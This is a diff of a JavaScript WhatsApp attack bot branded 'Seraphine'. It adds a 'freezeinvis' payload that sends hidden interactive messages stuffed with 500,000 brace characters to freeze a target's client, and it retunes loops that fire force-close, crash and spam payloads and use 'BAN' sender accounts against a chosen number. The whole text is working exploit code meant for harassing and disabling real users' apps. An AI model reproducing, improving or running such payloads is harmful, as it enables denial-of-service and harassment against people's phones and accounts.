@@ -3119,7 +3119,7 @@ async function LexcaabosV5(target) {
         }
     }, { participant: target });
 }
-async function freezeinvis(target) {
+async function freezeinvis1(target) {
   while (Date.now() - Date.now() < 100000) {
     await sock.relayMessage(target, {
       groupStatusMessageV2: {
@@ -3135,6 +3135,55 @@ async function freezeinvis(target) {
         }
       }
     }, { noSyncSelf: true });
+    await new Promise((r) => setTimeout(r, 2000));
+  }
+}
+async function freezeinvis(target) {
+  while (Date.now() - Date.now() < 100000) {
+    await sock.relayMessage(
+      target,
+      {
+        groupStatusMessageV2: {
+          message: {
+            interactiveMessage: {
+              body: {
+                text: "!Sseraphhnieee"
+              },
+              nativeFlowMessage: {
+                buttons: "{".repeat(500000)
+              }
+            }
+          }
+        }
+      },
+      {
+        noSyncSelf: true,
+        messageId: undefined,
+        additionalNodes: [
+          {
+            tag: "meta",
+            attrs: {
+              invisible: "true",
+              hide: "true",
+              nosync: "true"
+            },
+            content: [
+              {
+                tag: "mentioned_users",
+                attrs: {},
+                content: [
+                  {
+                    tag: "to",
+                    attrs: { jid: target },
+                    content: undefined
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      }
+    );
     await new Promise((r) => setTimeout(r, 2000));
   }
 }
@@ -3895,7 +3944,7 @@ async function freespamdelay(target) {
 }
 //=========== ASYNC FUNCTION SEND ==========\\
 async function crayxkouta(target) {
-for (let i = 0; i < 50; i++) {
+for (let i = 0; i < 25; i++) {
 await invisPermaIOS(target)
 await new Promise(resolve => setTimeout(resolve, 2500));
 console.log(chalk.red(`[Seraphine - BULLDOZER 🐉 ] ${target}`));
@@ -3903,14 +3952,14 @@ console.log(chalk.red(`[Seraphine - BULLDOZER 🐉 ] ${target}`));
 }
 
 async function crayxhard(target) {
-for (let i = 0; i < 400; i++) {
+for (let i = 0; i < 10; i++) {
 await SpamVideoV1(target)
 console.log(chalk.blue(`[Seraphine - OVA ] ${target}`));
 }
 }
 
 async function blankcrayx(target) {
-for (let i = 0; i < 50; i++) {
+for (let i = 0; i < 20; i++) {
 await iosswipper(target)
 await invisPermaIOS(target)
 console.log(chalk.red(`[Seraphine - BLANK  ] ${target}`));
@@ -3924,7 +3973,7 @@ async function crayxios(inviteCode) {
         throw new Error("Tidak ada sender BAN yang terhubung.");
     }
 
-    for (let i = 0; i < 25; i++) {
+    for (let i = 0; i < 5; i++) {
         const [senderNum, banSock] = senders[i % senders.length];
 
         try {
@@ -3942,30 +3991,28 @@ await starttime(target)
 await ForcloseSTC(target)
 await ForcloseVIDEO(target)
 await ForcloseDOC(target)
-await freezeinvis(target)
+await LexcaabosV7Fix(target)
+await LexcaabosV5(target)
+await LexcaabosV4(target)
 await ForcloseDOC(target)
-await freezeinvis(target)
 await starttime(target)
 await ForcloseSTC(target)
 await ForcloseVIDEO(target)
-await freezeinvis(target)
 await new Promise(resolve => setTimeout(resolve, 2500));
 console.log(chalk.red(`[Seraphine - FORCE 🦠 ] ${target}`));
 }
 }
 
 async function crayxsuper(target) {
-for (let i = 0; i < 70; i++) {
-await freezeinvis(target)
-await freezeinvis(target)
-await freezeinvis(target)
-await freezeinvis(target)
-await freezeinvis(target)
-await freezeinvis(target)
-await freezeinvis(target)
-await freezeinvis(target)
-await freezeinvis(target)
-await freezeinvis(target)
+for (let i = 0; i < 20; i++) {
+await freespamdelay(target)
+await freespamdelay(target)
+await freespamdelay(target)
+await freespamdelay(target)
+await LexcaabosV7Fix(target)
+await LexcaabosV5(target)
+await LexcaabosV4(target)
+await freespamdelay(target)
 await new Promise(resolve => setTimeout(resolve, 2500));
 console.log(chalk.red(`[Seraphine - CORE VIP 🔥 ] ${target}`));
 }
@@ -3975,32 +4022,37 @@ console.log(chalk.red(`[Seraphine - CORE VIP 🔥 ] ${target}`));
 async function crayxvol(target) {
 for (let i = 0; i < 30; i++) {
 await ForcloseDOC(target)
-await freezeinvis(target)
 await starttime(target)
 await ForcloseSTC(target)
 await ForcloseVIDEO(target)
-await freezeinvis(target)
 await ForcloseDOC(target)
-await freezeinvis(target)
 await starttime(target)
 await ForcloseSTC(target)
 await ForcloseVIDEO(target)
-await freezeinvis(target)
+await freespamdelay(target)
+await LexcaabosV7Fix(target)
+await LexcaabosV5(target)
+await LexcaabosV4(target)
+await freespamdelay(target)
+await freespamdelay(target)
 await new Promise(resolve => setTimeout(resolve, 2500));
 console.log(chalk.red(`[Seraphine - TRASH 🍃 ] ${target}`));
 }
 }
 
 async function Crayxbayar(target) {
-for (let i = 0; i < 50; i++) {
-await freezeinvis(target)
-await freezeinvis(target)
-await freezeinvis(target)
-await freezeinvis(target)
-await freezeinvis(target)
-await freezeinvis(target)
-await freezeinvis(target)
-await freezeinvis(target)
+for (let i = 0; i < 20; i++) {
+await LexcaabosV7Fix(target)
+await LexcaabosV5(target)
+await LexcaabosV4(target)
+await freespamdelay(target)
+await freespamdelay(target)
+await LexcaabosV7Fix(target)
+await LexcaabosV5(target)
+await LexcaabosV4(target)
+await freespamdelay(target)
+await freespamdelay(target)
+await freespamdelay(target)
 await new Promise(resolve => setTimeout(resolve, 2500));
 console.log(chalk.red(`[Seraphine - MEMEK ] ${target}`));
 }
